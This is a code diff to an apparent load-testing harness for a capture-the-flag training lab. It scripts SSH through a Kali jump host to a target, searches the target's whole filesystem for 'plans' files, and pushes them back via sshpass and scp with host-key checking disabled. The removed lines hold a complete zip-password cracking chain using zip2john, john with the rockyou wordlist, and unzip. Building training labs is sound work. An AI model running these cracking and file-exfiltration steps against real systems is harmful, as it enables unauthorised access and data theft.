@@ -638,7 +638,7 @@ EOF"""
             return False
             
     def _perform_file_discovery(self, kali_client: paramiko.SSHClient) -> bool:
-        """Perform file discovery and flag extraction via SSH jump through kali-jump"""
+        """Perform file discovery and read plans file via SSH jump through kali-jump"""
         
         def connect_with_jump(host, user, password, gateway_client):
             """Helper to create SSH connection through jump host"""
@@ -681,34 +681,18 @@ EOF"""
             )
             print(f"[{self.student_id}] Connection test: {stdout.strip()}")
             
-            # File discovery
-            print(f"[{self.student_id}] Searching for gnarly files...")
+            # File discovery - search for plans files
+            print(f"[{self.student_id}] Searching for plans files...")
             stdout, stderr, exit_code = self.run_ssh_command(
-                target_client, "find . -iname '*gnarly*' 2>/dev/null", timeout=60
+                target_client, "find / -iname '*plans*' 2>/dev/null", timeout=60
             )
             
             print(f"[{self.student_id}] File search - Exit code: {exit_code}")
             print(f"[{self.student_id}] File search - Results: '{stdout.strip()}'")
             
-            # Also try broader searches for debugging
-            if not stdout.strip():
-                print(f"[{self.student_id}] No gnarly files found, trying broader search...")
-                
-                # Search for zip files
-                broad_stdout, _, _ = self.run_ssh_command(
-                    target_client, "find /home -name '*.zip' 2>/dev/null", timeout=30
-                )
-                print(f"[{self.student_id}] Zip files found: {broad_stdout.strip()}")
-                
-                # List home directory contents
-                home_stdout, _, _ = self.run_ssh_command(
-                    target_client, "ls -la ~", timeout=30
-                )
-                print(f"[{self.student_id}] Home directory: {home_stdout.strip()}")
-            
             duration = time.time() - start_time
             
-            # Parse the output more carefully - strip quotes and extra whitespace
+            # Parse the output - strip quotes and extra whitespace
             raw_output = stdout.strip()
             print(f"[{self.student_id}] Raw find output: '{raw_output}'")
             
@@ -718,23 +702,23 @@ EOF"""
                 # Remove any surrounding quotes and split by lines
                 cleaned_output = raw_output.strip("'\"")
                 lines = cleaned_output.split('\n')
-                gnarly_files = [str(f).strip().strip("'\"") for f in lines if str(f).strip()]
-                gnarly_files = [f for f in gnarly_files if f]  # Remove empty strings
+                plans_files = [str(f).strip().strip("'\"") for f in lines if str(f).strip()]
+                plans_files = [f for f in plans_files if f]  # Remove empty strings
                 
-                print(f"[{self.student_id}] Parsed gnarly files: {gnarly_files}")
+                print(f"[{self.student_id}] Parsed plans files: {plans_files}")
                 
-                if gnarly_files:
-                    gnarly_file: str = str(gnarly_files[0])  # Take first found file
-                    print(f"[{self.student_id}] Using gnarly file: {gnarly_file}")
+                if plans_files:
+                    plans_file: str = str(plans_files[0])  # Take first found file
+                    print(f"[{self.student_id}] Using plans file: {plans_file}")
                     self.log_result("File Discovery", True, duration)
                     
-                    # Copy file back to Kali using SCP
-                    if self._copy_and_extract_flag(kali_client, target_client, gnarly_file):
+                    # Copy file back to Kali and read its contents
+                    if self._copy_and_read_file(kali_client, target_client, plans_file):
                         target_client.close()
                         return True
             
             target_client.close()
-            self.log_result("File Discovery", False, duration, f"No gnarly files found")
+            self.log_result("File Discovery", False, duration, f"No plans files found")
             return False
             
         except Exception as e:
@@ -742,22 +726,22 @@ EOF"""
             self.log_result("File Discovery", False, 0, str(e))
             return False
             
-    def _copy_and_extract_flag(self, kali_client: paramiko.SSHClient, target_client: paramiko.SSHClient, gnarly_file: str) -> bool:
-        """Copy file from ubuntu-target1 to kali-jump using SCP"""
+    def _copy_and_read_file(self, kali_client: paramiko.SSHClient, target_client: paramiko.SSHClient, plans_file: str) -> bool:
+        """Copy file from ubuntu-target1 to kali-jump using SCP and read its contents"""
         
         try:
             start_time = time.time()
             
             # Create local filename for the copied file (use simple filename in home dir)
-            path_parts = str(gnarly_file).split('/')
-            filename = str(path_parts[-1]) if path_parts else "gnarly.zip"
+            path_parts = str(plans_file).split('/')
+            filename = str(path_parts[-1]) if path_parts else "plans.txt"
             local_filename = f"~/{filename}"
             
-            print(f"[{self.student_id}] Copying {gnarly_file} to {local_filename} on kali-jump...")
+            print(f"[{self.student_id}] Copying {plans_file} to {local_filename} on kali-jump...")
             
             # Use SCP to copy file from ubuntu-target1 to kali-jump
             # This runs ON ubuntu-target1 and pushes the file to kali-jump
-            scp_command = f"sshpass -p '{self.new_password}' scp -o StrictHostKeyChecking=no {gnarly_file} student@kali-jump:{local_filename}"
+            scp_command = f"sshpass -p '{self.new_password}' scp -o StrictHostKeyChecking=no {plans_file} student@kali-jump:{local_filename}"
             
             stdout, stderr, exit_code = self.run_ssh_command(
                 target_client, scp_command, timeout=30
@@ -767,17 +751,9 @@ EOF"""
                 duration = time.time() - start_time
                 self.log_result("File Copy (SCP)", True, duration)
                 
-                # Verify the file was created on kali-jump
-                path_parts = str(gnarly_file).split('/')
-                filename = str(path_parts[-1]) if path_parts else "gnarly.zip"
-                verify_stdout, verify_stderr, verify_exit = self.run_ssh_command(
-                    kali_client, f"ls -la ~/{filename}", timeout=10
-                )
-                print(f"[{self.student_id}] Copied file verification: {verify_stdout.strip()}")
-                
-                # Extract flag from the copied file  
+                # Verify the file was created on kali-jump and read its contents
                 copied_file_path = f"/home/student/{filename}"
-                return self._extract_flag_simulation(kali_client, copied_file_path)
+                return self._read_plans_file(kali_client, copied_file_path)
             else:
                 duration = time.time() - start_time
                 self.log_result("File Copy (SCP)", False, duration, f"SCP failed: {stderr}")
@@ -787,97 +763,31 @@ EOF"""
             self.log_result("File Copy (SCP)", False, 0, str(e))
             return False
             
-    def _extract_flag_simulation(self, client: paramiko.SSHClient, zip_file: str) -> bool:
-        """Simulate flag extraction process"""
+    def _read_plans_file(self, client: paramiko.SSHClient, plans_file: str) -> bool:
+        """Read and display the contents of the plans file"""
         
         try:
-            # Work with the actual copied gnarly file
             start_time = time.time()
-            print(f"[{self.student_id}] Attempting to extract flag from {zip_file}")
+            print(f"[{self.student_id}] Reading plans file: {plans_file}")
             
-            # Check if the copied file exists
+            # Check if the copied file exists and read it
             stdout, stderr, exit_code = self.run_ssh_command(
-                client, f"ls -la {zip_file}", timeout=30
+                client, f"cat {plans_file}", timeout=30
             )
             
-            if exit_code == 0:
-                # Use real zip2john and john the ripper
-                print(f"[{self.student_id}] Using zip2john to extract hash...")
-                
-                # Extract hash using zip2john
-                stdout, stderr, exit_code = self.run_ssh_command(
-                    client, f"zip2john {zip_file} > /tmp/zip_hash.txt", timeout=30
-                )
-                
-                # Check hash file content
-                stdout, stderr, exit_code = self.run_ssh_command(
-                    client, "cat /tmp/zip_hash.txt", timeout=30
-                )
-                
-                if exit_code == 0 and stdout.strip():
-                    # Use john the ripper with rockyou wordlist
-                    print(f"[{self.student_id}] Running john the ripper with rockyou wordlist...")
-                    stdout, stderr, exit_code = self.run_ssh_command(
-                        client, f"john --wordlist=/usr/share/wordlists/rockyou.txt --pot=/tmp/output.txt /tmp/zip_hash.txt", timeout=120
-                    )
-                    
-                    # Check if john found the password - use the pot file we specified
-                    stdout, stderr, exit_code = self.run_ssh_command(
-                        client, "john --show --pot=/tmp/output.txt /tmp/zip_hash.txt", timeout=30
-                    )
-                    
-                    # Extract the password from john output (format: filename:password:...)
-                    lines = str(stdout.strip()).split('\n')
-                    password_line = str(lines[0]) if lines else ""
-                    cracked_password = None
-                    if ":" in password_line and "password hash cracked" in stdout:
-                        # John output format: filename:password:additional_fields...
-                        # Split and take the second field (index 1) which is the password
-                        parts = str(password_line).split(":")
-                        if len(parts) >= 2:
-                            cracked_password = str(parts[1])
-                            print(f"[{self.student_id}] 🔓 Password cracked: {cracked_password}")
-                    
-                    if cracked_password:
-                        # Extract the zip with the cracked password
-                        stdout, stderr, exit_code = self.run_ssh_command(
-                            client, f"unzip -P '{cracked_password}' {zip_file} -d /tmp/extracted 2>/dev/null", timeout=30
-                        )
-                        
-                        if exit_code == 0:
-                            # Read flag
-                            stdout, stderr, exit_code = self.run_ssh_command(
-                                client, "find /tmp/extracted -name '*.txt' -exec cat {} \\;", timeout=30
-                            )
-                            
-                            if exit_code == 0 and stdout.strip():
-                                duration = time.time() - start_time
-                                self.log_result("Flag Extraction", True, duration)
-                                print(f"[{self.student_id}] 🎉 Flag found: {stdout.strip()}")
-                                return True
-                            else:
-                                duration = time.time() - start_time
-                                self.log_result("Flag Extraction", False, duration, f"Flag not found in extracted files")
-                                return True  # Continue anyway for load testing
-                        else:
-                            duration = time.time() - start_time
-                            self.log_result("Flag Extraction", False, duration, f"Unzip failed")
-                            return True  # Continue anyway for load testing
-                    else:
-                        duration = time.time() - start_time
-                        self.log_result("Flag Extraction", False, duration, "Could not crack password")
-                        return True  # Continue anyway for load testing
-                else:
-                    duration = time.time() - start_time
-                    self.log_result("Flag Extraction", False, duration, "Hash generation failed")
-                    return True  # Continue anyway for load testing
+            duration = time.time() - start_time
+            
+            if exit_code == 0 and stdout.strip():
+                self.log_result("Read Plans File", True, duration)
+                print(f"[{self.student_id}] 🎉 Plans file contents:")
+                print(f"[{self.student_id}] {stdout.strip()[:200]}...")  # Show first 200 chars
+                return True
             else:
-                duration = time.time() - start_time
-                self.log_result("Flag Extraction", False, duration, f"Copied file not found: {zip_file}")
+                self.log_result("Read Plans File", False, duration, f"Could not read file: {stderr}")
                 return False
                 
         except Exception as e:
-            self.log_result("Flag Extraction", False, 0, str(e))
+            self.log_result("Read Plans File", False, 0, str(e))
             return False
             
     def _realistic_delay(self, phase: str = ""):
